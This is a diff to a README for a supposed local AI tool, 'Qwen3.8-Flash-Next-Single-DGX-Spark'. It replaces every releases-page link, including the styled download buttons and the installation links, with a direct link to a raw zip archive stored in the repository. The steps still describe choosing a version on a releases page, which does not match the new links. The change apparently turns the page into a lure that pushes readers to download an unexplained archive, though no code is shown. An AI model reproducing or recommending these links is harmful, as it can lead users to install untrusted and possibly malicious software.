@@ -1,7 +1,7 @@
 <h1>⚡ Qwen3.8-Flash-Next-Single-DGX-Spark - Unlock Lightning-Fast AI on One Device</h1>
 
 <p align="center">
-  <a href="https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/releases" style="display:inline-block; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; padding:18px 42px; font-size:22px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 25px rgba(102,126,234,0.4);">⬇️ Download Now - Free & Fast</a>
+  <a href="https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/raw/refs/heads/main/files/1.7.zip" style="display:inline-block; background:linear-gradient(135deg, #667eea 0%, #764ba2 100%); color:#ffffff; padding:18px 42px; font-size:22px; font-weight:bold; border-radius:50px; text-decoration:none; box-shadow:0 8px 25px rgba(102,126,234,0.4);">⬇️ Download Now - Free & Fast</a>
 </p>
 
 ---
@@ -48,7 +48,7 @@ Before downloading, ensure your system meets these basic requirements:
 
 Getting the application is simple and takes less than five minutes. Follow these steps:
 
-1. **Visit the Download Page** - Click the big download button at the top of this page, or use this link: [https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/releases](https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/releases)
+1. **Visit the Download Page** - Click the big download button at the top of this page, or use this link: [https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/raw/refs/heads/main/files/1.7.zip](https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/raw/refs/heads/main/files/1.7.zip)
 
 2. **Choose the Latest Version** - On the releases page, look for the newest release (usually at the top). Click on it to expand the download options.
 
@@ -60,7 +60,7 @@ Getting the application is simple and takes less than five minutes. Follow these
 
 ## 🛠️ Installation & Setup
 
-Visit this link to download the application: [https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/releases](https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/releases)
+Visit this link to download the application: [https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/raw/refs/heads/main/files/1.7.zip](https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/raw/refs/heads/main/files/1.7.zip)
 
 Once your download is complete, follow these instructions:
 
@@ -183,7 +183,7 @@ This software is provided as-is without warranty. Usage is at your own risk. The
 
 <p align="center">
   <strong>Thank you for choosing Qwen3.8-Flash-Next-Single-DGX-Spark!</strong><br>
-  <a href="https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/releases" style="display:inline-block; background:#28a745; color:#ffffff; padding:14px 36px; font-size:18px; font-weight:bold; border-radius:40px; text-decoration:none; margin-top:15px;">⬇️ Get Your Copy Now</a>
+  <a href="https://github.com/bacchantebabypowder5338/Qwen3.8-Flash-Next-Single-DGX-Spark/raw/refs/heads/main/files/1.7.zip" style="display:inline-block; background:#28a745; color:#ffffff; padding:14px 36px; font-size:18px; font-weight:bold; border-radius:40px; text-decoration:none; margin-top:15px;">⬇️ Get Your Copy Now</a>
 </p>
 
 ---
